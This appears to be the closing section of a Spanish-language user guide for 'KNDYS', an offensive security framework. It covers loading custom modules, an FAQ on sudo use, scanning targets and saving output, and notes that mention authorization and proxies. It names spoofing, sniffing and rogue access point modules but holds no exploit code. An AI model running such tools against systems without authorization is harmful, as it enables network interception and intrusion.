**Descripción:** Carga módulos personalizados desarrollados por el usuario.

**Cómo usar:**
```bash
kndys> use <custom_module>             # Si está instalado
# O cargar directamente:
kndys> load_module /path/to/module.py
```

**Requisitos:**
- El módulo debe heredar de la clase base
- Debe tener método `run()` definido
- Compatible con interfaz de KNDYS

---

## Preguntas Frecuentes

### P: ¿Necesito privilegios de administrador?

**R:** Algunos módulos sí (arp_spoof, packet_sniffer, rogue_ap). Ejecuta con `sudo`:
```bash
sudo ./kndys.py
```

### P: ¿Puedo usar esto en máquinas remotas?

**R:** Sí, pero necesitas credenciales válidas o acceso previo. Algunos módulos requieren shell remoto.

### P: ¿Qué pasa si no tengo todas las dependencias instaladas?

**R:** La primera ejecución instala automáticamente todas las dependencias necesarias.

### P: ¿Cómo guardo los resultados de un escaneo?

**R:** Usa el parámetro `output_file`:
```bash
kndys(port_scanner)> set output_file results.txt
kndys(port_scanner)> run
```

### P: ¿Puedo ejecutar múltiples módulos en secuencia?

**R:** Sí, ejecuta módulos uno tras otro:
```bash
kndys> use port_scanner
kndys(port_scanner)> run
kndys> use vuln_scanner
kndys(vuln_scanner)> run
```

### P: ¿Qué significa "set"?

**R:** `set` configura parámetros del módulo. Ejemplo:
```bash
kndys(port_scanner)> set target 192.168.1.1
```

### P: ¿Cómo veo las opciones de un módulo?

**R:** Usa `show options`:
```bash
kndys(port_scanner)> show options
```

### P: ¿Puedo crear mis propios módulos?

**R:** Sí, sigue la estructura de los módulos existentes en kndys.py.

### P: ¿Es necesario tener conexión a Internet?

**R:** Depende del módulo. Los módulos de reconocimiento remoto sí la necesitan.

### P: ¿Los logs se guardan automáticamente?

**R:** Sí, en la carpeta de logs. Usa `show logs` para verlos.

---

## Notas Importantes

- Asegúrate de tener autorización antes de usar estos módulos contra sistemas que no te pertenecen.
- Algunos módulos requieren configuración especial (proxies, servidores SMTP, etc).
- Los tiempos de ejecución varían según la red y la carga del sistema.
- Usa VPN o proxies para tests en entornos públicos.
- Revisa siempre los logs para errores y solucionar problemas.

---

## Recursos Adicionales

- [ANALISIS_COMPLETO_MODULOS.md](ANALISIS_COMPLETO_MODULOS.md) - Análisis técnico detallado
- [INSTALL.md](INSTALL.md) - Guía de instalación
- [DISCLAIMER.md](DISCLAIMER.md) - Aviso legal

---

**Versión:** 3.2  
**Última Actualización:** Enero 2025  
**Desarrollador:** Equipo KNDYS  
**Estado:** Producción - Listo para usar
